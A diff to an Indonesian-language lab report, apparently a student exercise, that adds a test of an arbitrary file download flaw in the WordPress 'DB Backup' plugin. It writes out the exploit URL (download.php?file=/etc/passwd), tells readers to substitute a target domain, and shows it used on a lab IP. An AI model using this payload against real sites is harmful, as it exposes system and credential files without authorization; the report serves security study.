@@ -234,6 +234,27 @@ Hasil uji coba
 
 Sumber referensi : https://www.exploit-db.com/exploits/40137/
 
+####4. Uji Arbitrary File Download terhadap plugin wordpress video DB Backup
+
+**Skenario 1** : Menccoba Mendownload file passwd dari server melalui direktori /etc/passwd
+
+```
+http://TARGET/wp-content/plugins/db-backup/download.php?file=/etc/passwd
+```
+masukkan link diatas melalui URL browser, ganti TARGET dengan domain wordpress yang ingin di serang
+
+pada percobaan ini link url di ubah menjadi
+````
+http://10.151.36.5/html/wp-content/plugins/db-backup/download.php?file=/etc/passwd
+````
+
+Hasil Uji Coba
+![Hasil Skenario 1](dbbackup/1.PNG)
+
+isi dari file hasil download : /etc/passwd
+
+![Hasil Skenario 1](dbbackup/2.PNG)
+
 ## Kesimpulan dan Saran
-1. Terdapat Banyak Plugin Wordpress yang dapat di eksploitasi menggunakan banyak cara. salah satu caranya adalah menggunakan sql injection.
+1. Terdapat Banyak Plugin Wordpress yang dapat di eksploitasi menggunakan banyak cara. salah satu caranya adalah menggunakan sql injection dan arbitraty file download.
 2. Untuk Menanganai hal ini, para pengguna web wordpress harus terus up to date dengan segala informasi terbaru mengenai plugin wordpress yang digunakan.
